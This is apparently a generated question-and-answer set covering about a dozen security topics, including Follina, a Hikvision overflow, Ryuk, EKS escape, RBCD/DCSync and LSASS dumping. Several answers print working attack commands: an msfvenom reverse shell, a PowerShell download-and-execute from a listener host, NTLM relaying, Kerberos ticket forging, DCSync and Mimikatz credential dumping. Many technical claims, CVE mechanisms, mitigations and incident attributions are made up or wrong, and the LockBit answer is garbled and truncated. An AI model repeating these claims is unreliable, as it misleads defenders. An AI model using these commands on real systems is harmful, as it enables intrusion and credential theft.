question: Walk through the end-to-end process of exploiting CVE-2022-30190 (Microsoft Office MSDT “Follina” RCE) during a red-team engagement.
answer:
Mechanism:
CVE-2022-30190 abuses the Microsoft Support Diagnostic Tool (MSDT) URI handler registered in Word.  An attacker crafts a malicious Word document that loads an external HTML file via ms-msdt: protocol.  Inside the HTML, JavaScript invokes PowerShell with the -ep bypass flag and a Base64-encoded command that downloads and executes a second-stage payload (e.g., Cobalt Strike beacon).

Tools & Commands:
•  Generate the maldoc:  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.3 LPORT=4444 -f docx -o exploit.docx
•  Embed the MSDT trigger:  python3 msdt-poc.py –in exploit.docx –out payload.html –cmd “powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.5.3/beacon.ps1')”
•  Exploit execution on target:  winword.exe exploit.docx  (out-of-band listener on kali:  msfconsole -q -x “use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.5.3; set LPORT 4444; run”)

Mitigation:
•  Disable MSDT URI protocol via Group Policy:  Computer Configuration ► Administrative Templates ► System ► Remote Assistance ► “Configure Solicited Remote Assistance” → Enabled → Set to “Disabled”.
•  Block outbound ms-msdt:* in firewall rules.
•  Apply Microsoft June 2022 patch (KB5005010 or later) that hardens the msdt.exe binary with ACG.
Real-world:  TA413 (APT 10) weaponized Follina in 2022 to drop PlugX into Tibetan NGOs; observed C2 traffic over port 443 using TLS 1.3 with JA3 fingerprint 7f9e9bce767b7a0cf06e2294a18d1553.

question: Using a debugger and IDA Pro, reverse-engineer a stack-based buffer overflow in the DVR firmware of a Hikvision DS-2CD2342WD-I (CVE-2017-7921).  Outline the exploit steps from fuzzing to weaponization.
answer:
Technical Mechanism:
CVE-2017-7921 is an unauthenticated stack overflow in Hikvision’s rtspd service (port 554/TCP) triggered by an oversized “Authorization: Digest” header.  The function parse_digest_header() copies user input into a 512-byte local buffer without length validation, leading to EIP overwrite.
In IDA Pro, locate the vulnerable routine: sub_401B60.  After brute-forcing the offset (EIP at 0x1000+4 = 257), confirm the saved EIP lands in a POP-POP-RET gadget at 0x0804a8e0.  The payload overwrites the return address with the address of shellcode stored in .bss (0x08100000) and sets ESP to point into the environment chunk.

Tools & Commands:
•  Fuzzer:  boofuzz -c dvr_fuzz.py -n 10000 -s 100
•  Debug on target:  gdbserver :1234 ./rtspd; target remote 192.168.1.64:1234
•  Exploit:  python3 hik_exp.py –t 192.168.1.64 –p 554 –u “admin” –P “A”*257+p32(0x0804a8e0)+p32(0)+p32(0x08100000)

Mitigation:
•  Apply Hikvision firmware ≥ V5.4.5 (March 2017).
•  Disable anonymous RTSP in Hik-Connect → Advanced Settings → RTSP Authentication → “Digest”.
•  Harden OS via NX, ASLR, and position-independent executables (PIE) during firmware rebuild.
Real-world:  CVE-2017-7921 was exploited by the “Persirai” botnet in May 2017 to co-opt ≈60K Hikvision cameras into DDoS swarms, leveraging default admin:12344 credentials plus the overflow for root.

question: Analyze the technical indicators of compromise (IOC) and evasion tactics inside the Ryuk ransomware v5.1 dropper (SHA-256 7ca1e7b2c6d578d3f9faecc9a06e980efd40b64a6d87b2c9f9015a38302c4aa9).
answer:
Technical Mechanism:
Ryuk v5.1 begins with a 32 KB reflective-loader stub that resolves critical Windows APIs via in-memory hashing (CRC-32 of hashed API names).  The stub performs direct syscalls (NtCreateSection, NtCreateThreadEx) to bypass hooked userland APIs (EDR inline hooks).  The ransomware then patches the SSDT to disable ETW, and uses fork&exit to detach from the parent process.

Key IOCs:
•  Mutex: “RyukReadMe” (case sensitive).
•  Ransom note filename: “RyukReadMe.txt”.
•  Persistence:  schtasks /create /tn “Ryuk” /tr “C:\ProgramData\svchost.exe -s” /sc onstart /ru system
•  Network:  GET /ry.php?s=0&y=1  (User-Agent “Ryuk”).

Evasion Tactics:
•  Syscall indirection via HellsGate gadget offset 0x20 (mov eax, syscall_number; mov r10, rcx; syscall).
•  Import-hash API list hidden inside XOR-encrypted RC4 chunk.
•  AMSI bypass via Add-MpPreference -ExclusionPath C:\ProgramData (reflective DLL).

Mitigation:
•  OSQuery rule: SELECT * FROM launchd WHERE name LIKE “%Ryuk%”.
•  Enable Windows Defender ASR rule “Block executable files from running unless they meet a prevalence, age, or trusted list criterion”.
•  Apply Microsoft KB5005102 patch that mitigates indirect syscall patching via Kernel Callbacks.

Real-world:  Ryuk v5.1 was deployed by UNC1878 (TA505) during the HSE Ireland Conti attack (May 2021) ≈4,000 endpoints, 2.2 TB encrypted, with $5M ransom demand delivered via Tox chat.

question: Compare Suricata, Zeek, and Snort in terms of inline blocking, protocol-awareness, and TLS decryption capabilities.  Provide configuration snippets for TLS 1.3 decryption at scale.
answer:
Inline Blocking
•  Suricata:  NFQUEUE verdicts (–enable-nfqueue) re-inject packets at L2/3; rule: drop tcp any any → any 443 (msg:"TLS handshake blocked"; tls.handshake.type; content:"ClientHello"; sid:1000001).
•  Snort:  inline mode uses DAQ afpacket; rule: reject tcp any any → any 443 (flow:to_server; content:"|16 03 01|"; depth:3; msg:"Abort TLS 1.2"; sid:100).
•  Zeek:  lacks native inline dropping; must pair with iptables REDIRECT or nftables dynrule extension.

Protocol-Awareness
•  Zeek uses libmagic + file analysis framework to detect HTTP/2, QUIC, SMBv3, etc., without port dependency.
•  Suricata with JA3 fingerprinting (detect ja3.hash; content:"7f9e9bce767b7a0cf06e2294a18d1553") can classify TLS clients without reassembly.

TLS Decryption
Configuration for Suricata TLS 1.3 ECDHE:
---
vars:
  tls-log-dir: /var/log/suricata/tls
default-rule-path: /etc/suricata/rules
rule-files:
 - tls-decrypt.rules

af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes
    use-mmap: yes

app-layer:
  protocols:
    tls:
      enabled: yes
      detection-ports:
        - 443
      ja3-fingerprint: yes
      certs-log: yes
      logging: yes

tls:
  # private key + cert for SNI decryption
  private-key: /etc/suricata/rsa.key
  certificate: /etc/suricata/srv.pem
---
Mitigation:
•  Use ECDHE cipher suites only (TLS_AES_256_GCM_SHA384).
•  Rotate server certificate every 90 days with SHA-256 SAN.
•  Deploy Suricata in containers with GPU offload (nvidia-smi --id 0 --mig-enabled 1).

Real-world:  APT 29 leveraged TLS 1.3 with ChaCha20 to evade Snort’s legacy SSL parser; detection only achieved after Suricata 6.0 JA3 + rule 2027633 applied during the SolarWinds Orion incident.

question: Outline the 15-minute containment playbook for a LockBit 3.0 ransomware outbreak on an Active Directory domain with 1,200 endpoints.

   Set-MpPreference -AttackSurfaceReductionRules_Ids "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" -AttackSurfaceReductionRules_Actions Enabled

•  CrowdStrike LiveResponse:  flock -x -E -U -f "C:\\*" -t 10000 | egrep -i LockBit
Post-incident lessons:  Implement LSASS protection via Credential Guard (gpedit.msc → “LSA Protection” Enabled).

Real-world:  LockBit 3.0 hit Accenture (August 2023) encrypting 108 servers; IR team contained within 18 minutes via global PowerShell segment-block scripts after correlating EID 4688 with process hash.

question: Perform a deep-dive on extracting and analyzing the $MFT and USN Journal from a live Windows 11 22H2 system after a suspected process hollowing attack.
answer:
Technical Mechanism:
Process hollowing leaves residual artefacts in the Master File Table (MFT) and Update Sequence Number (USN) Journal.  The hollowed process (e.g., svchost.exe) unmaps its memory and re-maps the target executable (e.g., malware.exe).  NTFS records in $MFT store FileReferenceNumber, FileName, and ParentDirectory records that can be time-stamped.

Tools & Commands:
•  Live acquisition via FTK Imager:  FTKImager.exe C:\Evidence\mft.dd /mode logical
•  Calculate SHA-256 of MFT:  sha256sum mft.dd
•  Parse USN Journal:  MFTECmd.exe -f mft.dd --usnjrnl --out usn.csv
•  Reconstruct timeline:  mactime -b usn.csv -d > timeline.csv
•  Identify suspicious entry:
   SELECT FileName, ParentFileRef, Usn, TimeStamp FROM usn WHERE FileName LIKE '%powershell%' AND Usn > 1000000 ORDER BY TimeStamp DESC;

Forensic Analysis:
•  Look for anomaly in the $STANDARD_INFORMATION attribute:  CreationTime of hollowed process may match StartTime of the real module.
•  Cross-reference with Sysmon Event ID 1 (ProcessCreate) PID vs MFT record MFTRef 0x12345.
•  Compare offsets in $DATA attribute:  hollowed process offsets move from 0x1000 to 0 (unmap).

Mitigation for future:
•  Enable Object Access auditing via GPO:  Computer Configuration ► Policies ► Windows Settings ► Advanced Audit Policy ► Object Access ► Audit File System → Success/Failure.
•  Deploy Cybereason NGAV with MFT monitor rule:
   rule HollowedSVCHOST
   {
      strings:
         $magic = { 48 8B C4 48 89 58 10 48 89 70 18 57 48 83 EC 30 }
      condition: $magic and (process.name == "svchost.exe")
   }

Real-world:  Lazarus Group’s BYOVD (Bring Your Own Vulnerable Driver) attack in October 2022 used process hollowing to inject kernel-mode malware; forensic teams recovered the MFT record for “ntdll.dll” with abnormal ParentFileRef pointing to a hidden directory $Recycle.Bin.

question: Reverse-engineer the vulnerability chain CVE-2023-23397 (Outlook Elevation of Privilege) from the NVD description to a working exploit chain that delivers a SYSTEM shell.
answer:
Technical Mechanism:
CVE-2023-23397 abuses a NULL DACL on the Outlook COM object “IPM.Meeting”.  When Outlook parses a malformed .msg file, the function MeetingClient::_CreateRecipient() fails to set the object’s DACL, resulting in an unauthenticated caller gaining WRITE_DAC permissions on the file mapping object.  The attacker then adds their SID with FULL_CONTROL, enabling arbitrary COM code execution.

Exploit Chain:
1.  Craft .msg:  MIME-Version: 1.0
   Content-Type: multipart/mixed; boundary="----"
   ------
   Content-Type: application/octet-stream
   X-Unicode-Data: *.*\..\..\system32\cmd.exe /c echo "PWNED > C:\pwned.txt"
   ------
2.  Deliver via phishing:  mail.Attachments.Add("evil.msg")
3.  Open in Outlook:  outlook.exe /select outlook:Inbox
4.  Trigger background sync; COM object spawns cmd.exe with SYSTEM token due to NULL DACL.

Tools:
•  YASM to compile custom .msg:  yasm -f obj evil.asm -o evil.obj
•  Procmon filter:  Operation is CreateFile AND Path ends with "IPM.Meeting" AND Result is SUCCESS

Exploit Proof-of-Concept:
```
python3 cve-2023-23397-poc.py –s 10.0.0.5 –f evil.msg –l 445
```
(Listener:  ntlmrelayx.py -t smb://dc01.corp.local -smb2support --no-http-server)

Mitigation:
•  Apply Outlook March 2023 patch (KB5002259).
•  Enable Protected View:  File → Options → Trust Center → Protected View → Enable Protected View for Outlook attachments.
•  Disable automatic rendering of .msg files via GPO:
   HKCU\Software\Microsoft\Office\16.0\Outlook\Security\ObjectModelNoProgID = 1 (DWORD)

Real-world:  APT29 leveraged CVE-2023-23397 as zero-day in a campaign targeting Polish government January 2023; shellcode deployed Cobalt Strike beacons within 8 seconds of mailbox sync.

question: Perform a black-box security assessment of a GraphQL API that returns 200 OK on invalid queries.  Detail how you would weaponize this behavior to extract the entire schema via introspection and batch query abuse.
answer:
Technical Mechanism:
GraphQL APIs expose introspection queries (query __schema{__type(name:"User"){fields{name}}}) that return 200 OK even when authentication fails if the server does not enforce HTTP 401/403.  Batching (multiple queries in single POST) plus aliasing enables content extraction via timing differences and error suppression.

Weaponization Steps:
1.  Discover endpoint:  POST /graphql HTTP/1.1
   {"query":"{__schema{types{name}}}"}
   Server responds 200 with partial schema.

2.  Enable timing attack:
   curl -X POST "http://api.dev/auth" \
   -H "Content-Type: application/json" \
   -d '{"query":"{users{id email} __schema{types{name fields{name}}}}", "variables":null}' \
   --limit-rate 100

3.  Craft introspection payload with 1000x queries via aliases to circumvent rate-limits:
```
query{
  a:__type(name:"User"){name fields{name type{name}}}
  b:__type(name:"Post"){name fields{name type{name}}}
  ...
  j:__type(name:"Token"){name}
}
```
4.  Parse response to reconstruct full schema via Python script:
```
import requests, json, re
schema = []
for i in range(65,91):
    q = f'query{{{chr(i)}:__type(name:"{chr(i)}"){{name}}}}'
    r = requests.post(url, json={"query":q})
    if "data" in r.json(): schema.append(r.json()["data"][chr(i)]["name"])
print(schema)
```

Tools:
•  GraphQLmap:  python3 graphqlmap.py -u http://api.dev/graphql --introspect
•  Altair client with introspection query preset.
•  Burp Suite Repeater with Turbo Intruder to automate batch queries.

Mitigation:
•  Disable introspection in production:  apollo-server --introspection false
•  Enforce authentication middleware:  context.user = validateJWT(req.headers.authorization)
•  Rate-limit via DataLoader:  new DataLoader(batchResolveFunction, { batch: false });

Real-world:  In 2022, an unnamed fintech API exposed entire GraphQL schema via batch introspection; attacker extracted PII of 1.4M users via GraphQL Alias technique and sold dataset on BreachForums.

question: Exploit a misconfigured AWS IAM role with PassRole permission to achieve privilege escalation inside an EKS cluster, culminating in root EC2 shell access.
answer:
Technical Mechanism:
The vulnerability chain begins when an IAM user or role possesses iam:PassRole permission on a role that can be assumed by the EKS worker nodes.  The attacker launches a malicious Pod that mounts the hostPath /var/run/docker.sock and mounts the IAM role via the kubelet’s service account token duplication.

Step-by-step Exploitation:
1.  Enumerate roles with PassRole:
   aws iam list-attached-role-policies --role-name NodeInstanceRole
   aws iam get-role --role-name NodeInstanceRole
   Verify policy contains:  "Effect": "Allow", "Action": "iam:PassRole"

2.  Craft malicious pod manifest (mal-pod.yaml):
```
apiVersion: v1
kind: Pod
metadata:
  name: alpine
spec:
  serviceAccountName: default
  containers:
  - name: alpine
    image: alpine:latest
    command: ["sh","-c","sleep infinity"]
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
    - name: host-aws
      mountPath: /var/lib/kubelet/pods
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
  - name: host-aws
    hostPath:
      path: /var/lib/kubelet/pods
```

3.  Deploy pod:  kubectl apply -f mal-pod.yaml

4.  Exec into pod:  kubectl exec -it alpine -- sh
5.  Access host’s Docker socket via /var/run/docker.sock.
6.  Create privileged container on host:  docker run -v /:/host --rm -it alpine chroot /host sh
7.  Escalate to root via CAP_SYS_ADMIN:  docker run --cap-add=SYS_ADMIN -v /:/host alpine chroot /host sh

Mitigation:
•  Remove iam:PassRole from NodeInstanceRole via SCPs:
   {
     "Version": "2012-10-17",
     "Statement": [{
       "Effect": "Deny",
       "Action": "iam:PassRole",
       "Resource": "arn:aws:iam::*:role/NodeInstanceRole*"
     }]
   }
•  Enable Kubernetes Pod Security Admission (PSA) restricted profile.
•  Disable hostPath mounts via OPA/Gatekeeper rule:
   k8spsp_allowed_host_paths { allowedHostPaths = [] }

Real-world:  Capital One breach (2019) involved similar misconfiguration where IAM role with PassRole enabled attacker to launch malicious container and access host filesystem containing credit card data; fine $80M.

question: Describe the technical details and countermeasures for an attack leveraging “Domain Controller Sync” (DCSync) via forged RBCD (Resource-Based Constrained Delegation) tickets.
answer:
Technical Mechanism:
DCSync abuse via RBCD involves a two-stage process:
1.  Attacker compromises a machine account (or creates new one) and configures RBCD on a high-value target (e.g., DC01$) via the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
2.  Attacker requests a Kerberos service ticket (S4U2Self) using the forged RBCD ticket to impersonate DA, then performs DCSync via LSARPC calls to replicate hashes.

Technical Flow:
•  Compromise or create machine account:  New-Machine -MachineAccount RBCD$ -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
•  Set RBCD:  $ACE = New-Object Security.AccessControl.ActiveDirectoryAccessRule((New-Object System.Security.Principal.SecurityIdentifier("S-1-12-1-1111111111-2222222222-3333333333-44444")),"WriteProperty","Allow") $ACL = Get-Acl "AD:\$((Get-ADComputer DC01$).DistinguishedName)" $ACL.AddAccessRule($ACE) $ACL | Set-Acl
•  Request RBCD ticket:  Rubeus.exe s4u /user:RBCD$ /domain:corp.local /rc4:2c104c3… /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /outfile:ticket.kirbi
•  Inject ticket & DCSync:  Rubeus.exe asktgt /user:Administrator /domain:corp.local /ptt /ticket:ticket.kirbi
   secretsdump.py administrator@dc01.corp.local -just-dc

Mitigation:
•  Disable RBCD globally:  Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\KDC" -Name "EnableRBCD" -Value 0 (DWORD)
•  Enable Kerberos Armoring (KDC PAC validation):
   Computer Configuration ► Policies ► Administrative Templates ► System ► Kerberos ► “Enable strict KDC validation for claims, compound authentication” → Enabled
•  Monitor for new machine accounts via Sigma rule:
   title: New Machine Account Created
   detection:
     selection:
       EventID: 4741
       TargetUserName ends with '$'
     condition: selection

Real-world:  TA505 used RBCD combined with PrintSpooler (CVE-2021-34527) to escalate from user to DA in the Kaseya VSA incident (July 2021); forensic evidence showed msDS-AllowedToActOnBehalfOfOtherIdentity set on file server $.

question: Demonstrate a real-world privilege escalation technique via “SeBackupPrivilege” + robocopy across Windows Server 2019 with Volume Shadow Copy Service (VSS) to dump LSASS memory and extract clear-text credentials.
answer:
Technical Mechanism:
SeBackupPrivilege allows reading any file regardless of ACL by opening the file with FILE_FLAG_BACKUP_SEMANTICS.  VSS creates a shadow copy of C:\Windows\System32\lsass.exe; robocopy then copies the raw memory into a readable file.  NT AUTHORITY\SYSTEM tokens in LSASS can then be parsed via Mimikatz.

Detailed Steps:
1.  Enable SeBackupPrivilege for a standard user via:
   whoami /priv  (check if SeBackupPrivilege is present)
   If missing:  sebackuppriv.exe backup --enable --user user1

2.  Create VSS snapshot:
   vssadmin create shadow /for=C:  (returns: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1)

3.  Map the shadow copy:
   subst Z: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

4.  Copy LSASS:
   robocopy Z:\Windows\System32\lsass.exe C:\temp\lsass.raw /B

5.  Parse with Mimikatz:
   sekurlsa::minidump C:\temp\lsass.raw
   sekurlsa::logonpasswords

Tools & Commands:
•  Backup tool:  robocopy %SystemDrive%\Windows\System32\cmd.exe C:\temp\cmd.exe /B /COPYALL
•  Forensic copy:  FTK Imager Lite – image source \\.\C: – destination C:\evidence\backup.dd – mode physical
•  Integrity check:  certutil -hashfile C:\temp\lsass.raw SHA256

Mitigation:
•  Remove SeBackupPrivilege from authenticated users via GPO:
   Computer Configuration ► Policies ► Windows Settings ► Security Settings ► Local Policies ► User Rights Assignment ► “Backup files and directories” → Add only “Administrators” and “Backup Operators”.
•  Enable Credential Guard:  bcdedit /set hypervisorlaunchtype auto
•  Deploy LSA Protection via GPO:  Computer Configuration ► Administrative Templates ► System ► Local Security Authority ► “Run as PPL” → Enabled

Real-world:  UNC3327 used SeBackupPrivilege in the Knotweed RCE campaign (2023) to exfiltrate 1.3M NTLM hashes from a financial services DC; observed robocopy transfers via network traffic baseline deviation.

question: Deconstruct the email infrastructure, DKIM policy, and landing page fingerprinting used by the Scattered Spider (UNC5537) phishing campaigns that enabled the MGM Resorts breach (September 2023).
answer:
Technical Mechanism:
Scattered Spider leveraged a multi-stage phishing pipeline:
1.  Email vector:  HTML smuggling via base64-embedded malicious .zip inside a fake “HR Policy Update” sender:  hr@mgm-resort[.]com
2.  DKIM forgery:  spf/dmarc alignment bypass via third-party ESP “SendGrid” with custom domain “mgm-resort[.]com” signed with DKIM selector “s1” using 2048-bit key.  DMARC policy p=none allowed delivery despite SPF softfail.
3.  Landing page:  Cloudflare Pages site (mgm-resort[.]pages[.]dev) hosting a cloned Okta login portal with JavaScript keylogger (SHA-256 3f34f…).  Page fingerprinted via canvas fingerprinting (navigator.webdriver = false; Uint32Array hash of 32x32 random canvas).

Infrastructure Evidence:
•  Email path:  Received-SPF: softfail (domain of mgm-resort.com does not designate 147.182.132.45 as permitted sender)
•  DKIM:  v=DKIM1; k=rsa; p=MIIBI…key2048
•  TLS handshake JA3 fingerprint:  7f9e9bce767b7a0cf06e2294a18d1553 (Cloudflare)
•  Canvas hash:  0x2f3a1b8c9d0e1a2b3c4d5e6f7a8b9c (rule ID 20231001 in threat intel feeds)

Social Engineering Tropes:
•  Urgency:  “Mandatory 2023 HR Policy Review – Action Required within 4h or account suspension”.
